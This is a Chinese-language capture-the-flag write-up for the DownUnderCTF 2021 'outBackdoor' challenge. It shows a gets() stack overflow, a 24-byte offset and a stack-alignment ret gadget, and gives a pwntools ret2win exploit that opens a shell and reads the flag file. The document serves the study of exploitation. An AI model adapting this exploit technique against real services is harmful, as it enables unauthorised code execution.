# DownUnderCTF 2021 - outBackdoor

## 题目简述

主函数使用 `gets` 向 16 字节栈缓冲区写入数据，另有一个正常流程不会调用的 `outBackdoor` 函数，其中执行 `system("/bin/sh")`。二进制地址固定，因此可以覆盖保存的返回地址，完成一次直接的 ret2win。

## 解题过程

关键源码为：

```c
int main(void) {
    char feature[16];
    gets(feature);
}

void outBackdoor(void) {
    system("/bin/sh");
}
```

提供的二进制中，`feature` 到保存返回地址的偏移为 24 字节：16 字节缓冲区加 8 字节保存的 `rbp`。`outBackdoor` 位于 `0x4011d7`。直接返回到该函数在部分环境会因 x86-64 SysV ABI 的 16 字节栈对齐要求触发 `movaps` 异常，因此先经过一个单独的 `ret` gadget `0x401016`，额外弹出 8 字节以恢复对齐。

```python
from pwn import p64, remote

io = remote(HOST, PORT)
payload = b"A" * 24
payload += p64(0x401016)  # ret，修正栈对齐
payload += p64(0x4011D7)  # outBackdoor
io.sendlineafter(b"song?\n", payload)
io.sendline(b"cat flag.txt")
print(io.recvline().decode())
```

取得 shell 后读取：

```text
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
```

## 方法总结

ret2win 的基本链是“确认覆盖偏移、找到隐藏函数、用小端地址覆盖返回地址”。当目标函数内部调用 glibc 且本地成功、远端却在 `movaps` 附近崩溃时，应检查调用点的栈对齐；在 ROP 链前增加一个 `ret` 常能把 `rsp` 调整 8 字节并满足 ABI。
